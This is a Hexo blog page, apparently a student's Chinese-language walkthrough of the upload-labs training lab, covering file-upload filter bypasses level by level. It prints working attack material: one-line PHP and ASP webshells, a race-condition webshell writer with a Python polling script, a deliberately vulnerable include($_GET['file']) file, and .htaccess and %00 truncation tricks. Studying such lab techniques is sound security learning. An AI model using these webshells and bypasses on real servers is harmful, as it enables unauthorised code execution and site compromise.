@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="title:uploadpass-01:尝试直接上传一句话木马，发现页面显示文件不允许上传，只允许jpg,png,gif类型的文件上传，说明上传被过滤了，由于这题只是前端过滤，因此我们可以先更改后缀名，然后通过burpsuit进行抓包，绕过过滤之后再把文件的后缀名改回PHP的文件类型，这样就成功将php的一句话木马上传到了服务器。方法二，由于是前端过滤直接把过滤函数删掉。或者加上允许php类型文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/04/17/upload/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="title:uploadpass-01:尝试直接上传一句话木马，发现页面显示文件不允许上传，只允许jpg,png,gif类型的文件上传，说明上传被过滤了，由于这题只是前端过滤，因此我们可以先更改后缀名，然后通过burpsuit进行抓包，绕过过滤之后再把文件的后缀名改回PHP的文件类型，这样就成功将php的一句话木马上传到了服务器。方法二，由于是前端过滤直接把过滤函数删掉。或者加上允许php类型文">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-17T06:04:38.559Z">
+<meta property="article:modified_time" content="2022-03-18T12:09:20.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-upload" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/upload/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.559Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-upload"><a href="#title-upload" class="headerlink" title="title:upload"></a>title:upload</h2><p>pass-01:<br>尝试直接上传一句话木马，发现页面显示文件不允许上传，只允许jpg,png,gif类型的文件上传<br>，说明上传被过滤了，由于这题只是前端过滤，因此我们可以先更改后缀名，然后通过burpsuit进行抓包，<br>绕过过滤之后再把文件的后缀名改回PHP的文件类型，这样就成功将php的一句话木马上传到了服务器。<br>方法二，由于是前端过滤直接把过滤函数删掉。或者加上允许php类型文件上传<br>————<br>pass-02:<br>提示是会在服务端对数据包的MIME进行检查，那么什么是数据包的MIME？<br>使用MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准，使用MIME类型可以设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p>
+<p>在JSP页面中，contentType属性设置为：contentType&#x3D;“text&#x2F;html;charset&#x3D;GBK”。<br>这里我们直接上传PHP文件不会被限制，但是它会检查MIME类型，所以在抓包之后修改content-type的类型，将其改为image&#x2F;png绕过。<br>这题也可以和第一题一样先以jpg的形式上传，在抓包后再更改后缀名同样也行<br>————<br>pass-03:<br>查看源码，这里有一个黑名单，限制了一些文件类型的上传。但是这个我们可以通过例如php3,php4,php5,phtml,pht的后缀名绕过<br>————<br>pass-04:<br>还是黑名单，加强版。但是发现有一个文件是没有过滤，也就是.htaccess。<br>.htaccess基础知识<em>重点内容</em><br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，<br>所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，<br>可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。<br>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>它里面有这样一段代码：AllowOverride None，如果我们把None改成All<br>也就是说我们可以通过该文件将所有文件解析为php。<br>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。<br>这里我们上传的.htaccess文件内容是：SetHandler application&#x2F;x-httpd-php	这样所有文件都会解析为php<br>然后抓包的时候要把.htaccess前面的文件名删掉<br>然后我们上传图片马就可以了<br>————<br>pass-05:<br>黑名单继续，并且不允许上传.htaccess文件。但是没有将后缀进行大小写统一，我们可以通过大小写绕过。例如将后缀名改为Php。<br>另外他的过滤只进行一次，我们可以构建1.php.php的形式绕过。<br>pass-06同理，且由于没有进行去空格处理，可以在后缀名中加空格绕过。<br>————<br>pass05~07总结：<br>常见绕过方式：空格 大小写 只过滤一次，类似于参数污染<br>大小写统一的函数名称是strtolower()作用是转换为小写。将文件的后缀名用大小写混写绕过。<br>去空格的函数是trim（）进行首尾去空格处理。在文件名的后缀名前或后加上一个空格绕过<br>过滤文件名末尾的点的函数是deldot（）作用是删除文件名末尾的点。补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来<br>这样我们可以在文件的后缀名上加一个点进行绕过。这样利用windows特性，会自动去掉后缀名中最后的点，正常执行。<br>——————<br>pass-08：<br>补充知识：php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。<br>上传PHP一句话文件，抓包改后缀zoe.php::$DATA<br>然后使用蚁剑连接zoe.php （注意蚁剑连接路径不要加上::$DATA）<br>——————<br>pass-09：<br>由于路径拼接的是处理后的文件名，因此我们将后缀名取为.php. .（点+空格+点）），经过处理后的后缀名就变成了.php.就可以绕过。<br>——————<br>pass-10：<br>这里它的过滤使用了str_ireplace()函数，作用是把不合规范的后缀名准换为空，使文件上传失败，因此这里我们就可以采用双写绕过的方式，将后缀名写为.pphphp绕过<br>——————<br>pass-11：<br>这里是白名单验证通过，只有使用白名单的后缀名才可以通过。但是我们看到他的文件路径是直接拼接变量的方式，因此可以利用%00截断绕过（和之前sql注入的一个题目类似啊）<br>截断上传的前提条件：php 版本 &lt; 5.3.4且php的参数magic_quotes_gpc必须关闭。<br>原理是：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片<br>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。<br>知识补充：<br>strrpos(string,find[,start]) 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。<br>substr(string,start[,length])函数返回字符串的一部分(从start开始 [，长度为length])<br>magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对$_REQUEST, $_GET,$_POST,$_COOKIE 输入的内容进行过滤<br>$img_path &#x3D; $_GET[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;分析这一句代码，发现变量’save_path’是用户可以控制的上传变量，因此我们对<br>这个变量进行一些操作。可以通过一个例子详解的了解一下。<br>&lt;%<br>path&#x3D;”upload&#x2F;web&#x2F;“<br>file&#x3D;”1.jpg”<br>upfilename&#x3D;path &amp; file ‘最后的上传地址<br>%&gt;<br>将路径改为path&#x3D;”upload&#x2F;web&#x2F;1.php%00”,那么拼接之后，文件上传时就变成了<br>“upload&#x2F;web&#x2F;1.php%001.jpg”，这时上传便将1.php上传进去，而1.jpg则被截断，我理解的就是相对于省略符号，将后面的内容给省略了，相当于MySQL注入语句中的#、–+等<br>而截断了1 .jpg，但是1.jpg的内容是被1.php给继承过去了。因此我们才能够成功上传。<br>——————<br>pass-12：<br>改变了将变量的上传方式变为了post类型，其他一样。但是post类型不会像get类型一样对%00进行自动解码。因此我们在抓包之后先修改上传的路径名，加上muma.php+这里之所以要<br>加上一个加号是起到一个标记的功能，因为我们要将抓包修改后的数据发给decoder(编码器)文本都是以二进制显示的不方便找到修改的位置，而＋号的十六进制是2b，我们直接找到2b就可以了，<br>然后将2b修改为00编码后再发送。<br>——————<br>pass-13：<br>图片马的制作方式：第一种方法<br>我把图片命名为1.jpg</p>
+<p>接下来写一句话木马<br>新建一个2.asp文件，写入一句话木马<br>&lt;%Y&#x3D;request(“xindong”)%&gt; &lt;%execute(Y)%&gt;</p>
+<p>然后在win+R，cmd，cd到原始图片的目录路径下</p>
+<p>copy 1.jpg&#x2F;b+2.php&#x2F;a 3.jpg</p>
+<p>桌面上出现新的图片就是制作出的图片马</p>
+<p>第二种方法<br>通过工具C32将一句话木马插入到文件的最后<br>在制作好图片马之后上传就OK了<br>——————<br>pass-14:<br>知识补充，文件包含漏洞。<br>文件包含漏洞<br>文件包含<br>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件,无需再次编写,这种调用文件的过程通常称为包含。</p>
+<p>程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p>
+<p>几乎所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP&#x2F;ASP&#x2F;ASP.net程序中比较少。<br>漏洞产生的原因<br>1、web应用实现了动态包含<br>2、动态包含的文件路径参数，客户端可控</p>
+<p>PHP中的文件包含<br>*语句<br>PHP中提供了四个文件包含的函数,四个函数之间略有区别。如下函数区别<br>include()<br>文件包含失败时,会产生警告,脚本会继续运行。</p>
+<p>include_once()<br>与include()功能相同,文件只会被包含一次。</p>
+<p>require()<br>文件包含失败时,会产生错误,直接结束脚本执行。</p>
+<p>require_once()<br>与require()功能相同,文件只会被包含一次。</p>
+<p>*相关配置<br>文件包含是PHP的基本功能之一，有本地文件包含和远程文件包含之分(虽然php官网上不是这么解释的)。简单来说，本地文件包含就是可以读取和打开本地文件，远程文件包含<br>(HTTT, FTP, PHP伪协议)就是可以远程加载文件。我们可以通过php. ini来进行配置。如下</p>
+<p>allow_ url_ fopen&#x3D;0n&#x2F;0ff<br>本地文件包含(LFI)<br>allow_ url_ include&#x3D;0n&#x2F;0ff<br>远程文件包含(RFI)<br>更详细的链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/marsper/article/details/110291687?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%9B%BE%E7%89%87%E9%A9%AC&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-110291687.es_vector_control_group&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/marsper/article/details/110291687?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%9B%BE%E7%89%87%E9%A9%AC&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-110291687.es_vector_control_group&amp;spm=1018.2226.3001.4187</a></p>
+<p>因此这题的解决首先我要先在upload文件夹中写一个PHP文件存在文件包含漏洞，代码如下：<br><?php
+$file = $_GET[ 'file' ] ;
+include ($file);
+?><br>然后把文件名命名为include.php。分析一下这个代码，发现它会include方式执行图片马。(如果发现图片马没有办法执行，就换一个)<br>查看源码后，意思是：读取上传文件的前两个字节内容，unpack解码后，使用intval转换为10进制，默认为10进制，根据转换后的结果判断图片类型。<br>因此通过图片马达到绕过的目的<br>构建的payload：<a target="_blank" rel="noopener" href="http://localhost/upload-labs/upload/include.php?file=%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%8815713.jpg%EF%BC%89">http://localhost/upload-labs/upload/include.php?file=图片文件名（15713.jpg）</a><br>———————<br>pass 15:<br>与pass 14没有太大差别，通过getimagesize()检查是否为图片文件，所以还是可以用第十四关的图片马绕过，并使用文件包含漏洞解析图片马。<br>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
+<p>语法格式：</p>
+<p>array getimagesize ( string $filename [, array &amp;$imageinfo ] )<br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。<br>索引 0 给出的是图像宽度的像素值<br>索引 1 给出的是图像高度的像素值<br>索引 2 给出的是图像的类型，返回的是数字，其中1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM<br>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签<br>索引 bits 给出的是图像的每种颜色的位数，二进制格式<br>索引 channels 给出的是图像的通道值，RGB 图像默认是 3<br>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image&#x2F;jpeg”);<br>——————<br>pass 15:<br>这一关使用exif_imagetype()来判断图像的类型。<br>exif_imagetype — 用于判断一个图像的类型，读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。</p>
+<p>如果不是真实的图像，则会获取信息失败，所以要绕过该检测方式也需要用到图片一句话木马。方法同Pass13，需要配合文件包含漏洞或文件解析漏洞。<br>需要开启php_exif模块<br>——————<br>pass 16:<br>什么是二次渲染：二次渲染，就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。在二次渲染的过程中，我们图片中所写的木马也可能会被渲染掉。<br>绕过二次渲染的核心思想便是先上传一张图片，再将上传完成后的图片下载下来，对比渲染前后图片的编码变化，将我们的代码写在未被渲染的区域便可绕过二次渲染。发现burpsuit的camparer可以实现。没有标记颜色的就是渲染没有改变的地方，在这里写入一句话木马。<br>由于不同格式文件的特性，在进行绕过二次渲染时，选用gif的图像最容易成功，对于jpg和png这两种图片需要用脚本进行改写。<br>——————<br>pass 17:<br>关于线程和进程的知识补充：<br>进程：<br>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程 通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上 下文进程间的切换开销（栈、寄存器、虚拟内 存、文件句柄等）比较大，但相对比较稳定安 全。</p>
+<p>线程：<br>线程的是为了降低上下文切换的消耗，提高系 统的并发性，并突破一个进程只能干一样事的 缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基 本单位,它是比进程更小的能独立运行的基本单 位。线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄 存器和栈),<br>但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。<br>条件竞技：条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。<br>因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<p>代码审计发现：对于上传的文件处理是先保存到服务器，再对比拓展名，如果拓展名不属于白名单中的三种后缀，便由18行的操作执行unlink操作将保存的文件删除。这里的突破口是我们上传的文件会先被放到服务器上，再进行 白名单验证，如果不符合条件再通过unlink函数删掉这个文件，<br>那么这里的bug就是不管我们的文件是否会被删掉，都会先被上传到服务器，只要我们能够做到在服务器执行unlink函数的功能之前访问上传的文件，那么就能够成功写入websheel。<br>攻击者不断的发起访问请求访问该文件，该文件一旦被执行，就会在服务器上生成一个恶意的shell文件。<br>于是我们就可以通过burpsuit不断对目标网站发起访问请求。<br>在上传以后储存在服务器，到检查不通过的这段时间如果我们可以利用起来，就算后续他将文件删除了也无所谓，那么这段时间太短了，如何将其放大？那就利用burp的intruder，随便弄一个peyload让他在那边跑就行，然后我们在浏览器中直接访问该文件<br>我们构建这样的一个webshell:<?php fputs(fopen('attack.php','w'),'<?php @eval($_POST["attack"])?>‘);?&gt;<br>把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个attack.php的一句话。<br>接下来进行操作。<br>首先，我们上传PHP文件，用BP拦截<br>然后选择Clear$<br>接着设置无限发送空的Payloads，来让它一直上传该文件<br>把线程设置高一点<br>然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件</p>
+<p>python脚本：<br>import requests<br>url &#x3D; “<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php&quot;">http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php&quot;</a><br>while True:<br>    html &#x3D; requests.get(url)<br>    if html.status_code &#x3D;&#x3D; 200:<br>        print(“OK”)<br>        break<br>脚本的url地址XXX都是代表IP地址<br>接下来我们可以在BP点击开始攻击<br>可以看到上传该文件的数据包不停地在进行重放。</p>
+<p>在BP攻击的同时我们也要运行python脚本，目的就是不停地访问attack.php知道成功访问到为止。当出现OK说明访问到了该文件，那么attack.php应该也创建成功了，用蚁剑连一下试试。<br>————————<br>pass 18：<br>没有太大的差别，只是我们上传的木马要改成图片马。<br>————————<br>pass 19:<br>开始本关之前，先来了解一下什么是00截断：</p>
+<p>事实上0x00，%00这两类截断都是属于同种原理，%00在url解码后为空字符，0X00即16进制的00，只是表示和用法不同而已<br>无论0x00还是%00，最终被解析后都是一个东西:chr（0）</p>
+<p>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p>
+<p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p>
+<p>举例说明：<br>当我们在GET场景上传一个名为eval.php%00.jpg的文件，后台程序收到此文件后，开始检测其名称，当检测到%00后产生截断，不再继续解析%00之后的内容。于是，系统上存储的实际为eval.php。</p>
+<p>如何利用%00以及0x00截断：<br>1.php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
+<p>2.magic_quotes_gpc需要为OFF状态<br>当打开magic_quotes_gpc时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL字符（%00）都会被自动加上一个反斜杠进行转义。</p>
+<p>3.文件路径可控（即本关卡），比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads&#x2F;，就可以直接把路径构造成uploads&#x2F;xxx.php%00，先构造一个存在截断字符的后缀“等着”真正的文件名，或者后缀名，因为不管它是啥，都会被截断而丢弃</p>
+<p>一般来说，在GET传参时，由于url中的内容会进行url编码，而%00在经过解码之后便是空字符导致截断。<br>而在在POST传参时， POST 中 %00 不会被 url 解码，所以只能通过 burpsuite 修改 hex 值为 00 进行截断。<br>本关用到了move_uploaded_file()，由POST方式获取文件，因此可以使用13关的过关方式：%00截断，更改Hex中的十六进制码即可。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/upload/" data-id="cl22vvyyq000kl4vj374u54b3" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/04/17/%E7%BC%96%E7%A0%81%E8%A1%A5%E5%85%85/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/04/17/sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8Csqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E8%AF%AD%E5%8F%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sql注入原理和sqlmap的基本操作</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/17/less%2046~53%20order%20by%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2038~42/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/LESS%2032~37/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2029~31/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2018~22/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
